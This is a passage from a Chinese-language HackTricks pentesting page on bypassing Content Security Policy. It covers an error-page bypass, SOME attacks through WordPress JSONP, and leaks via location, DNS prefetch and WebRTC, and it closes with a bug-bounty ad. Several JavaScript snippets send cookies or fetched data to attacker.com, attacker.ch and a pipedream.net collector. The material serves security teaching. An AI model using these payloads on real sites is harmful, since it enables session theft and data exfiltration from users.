从[**这篇文章**](https://blog.ssrf.kr/69)中看来，可以通过加载一个错误页面（可能没有CSP）并重写其内容来绕过CSP保护。
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOME是一种滥用页面端点中的XSS（或高度受限的XSS）的技术，以滥用同一源的其他端点。这是通过从攻击者页面加载易受攻击的端点，然后将攻击者页面刷新到要滥用的同一源的真实端点来实现的。这样，易受攻击的端点可以使用负载中的`opener`对象来访问要滥用的真实端点的DOM。有关更多信息，请参阅：

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

此外，**wordpress**在`/wp-json/wp/v2/users/1?_jsonp=data`中有一个**JSONP**端点，将在输出中**反射**发送的**数据**（仅限字母、数字和点）。

攻击者可以滥用该端点对WordPress进行SOME攻击，并将其嵌入`<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>`中，请注意，此**脚本**将被**加载**，因为它被'`self`'允许。此外，由于安装了WordPress，攻击者可能通过**绕过CSP**的易受攻击的**回调**端点来滥用SOME攻击，以为用户提供更多权限，安装新插件等。\
有关如何执行此攻击的更多信息，请查看[https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP信息泄露绕过

如果存在严格的CSP，不允许您与外部服务器进行交互，您始终可以执行一些操作来泄露信息。

### Location

您可以更新位置以将秘密信息发送到攻击者的服务器：
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Meta标签

您可以通过注入一个meta标签来进行重定向（这只是一个重定向，不会泄露内容）
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS 预解析

为了加快页面加载速度，浏览器会提前将主机名解析为 IP 地址并缓存起来以备后用。\
您可以使用以下方式告知浏览器预解析主机名：`<link reol="dns-prefetch" href="something.com">`

您可以利用这种行为来通过 DNS 请求**泄露敏感信息**：
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
另一种方法：
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
为了避免这种情况发生，服务器可以发送以下HTTP头部：
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
显然，这种技术在无头浏览器（机器人）中不起作用
{% endhint %}

### WebRTC

在一些页面上，你可以看到**WebRTC不检查CSP的`connect-src`策略**。
```javascript
var pc = new RTCPeerConnection({"iceServers":[{"urls":["turn:74.125.140.127:19305?transport=udp"],"username":"_all_your_data_belongs_to_us","credential":"."}]});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp));
```
然而，看起来[不再可能](https://github.com/w3c/webrtc-nv-use-cases/issues/35)（或者至少不那么容易）。

如果你知道如何使用WebRTC泄露信息，请[**提交拉取请求！**](https://github.com/carlospolop/hacktricks)

## 在线检查CSP策略

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## 自动创建CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## 参考资料

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)

​

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof是所有加密漏洞赏金的家园。**

**即时获得奖励**\
HackenProof的赏金只有在客户存入奖励预算后才会启动。在漏洞验证后，您将获得奖励。

**在Web3渗透测试中积累经验**\
区块链协议和智能合约是新的互联网！掌握正在崛起的Web3安全。

**成为Web3黑客传奇**\
每次验证的漏洞都会获得声誉积分，并占领每周排行榜的榜首。

[**在HackenProof上注册**](https://hackenproof.com/register)开始从您的黑客行动中获利！

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在**网络安全公司**工作吗？想要在HackTricks中看到您的**公司广告**？或者想要访问**PEASS的最新版本或下载PDF格式的HackTricks**？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFT收藏品**](https://opensea.io/collection/the-peass-family)——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>
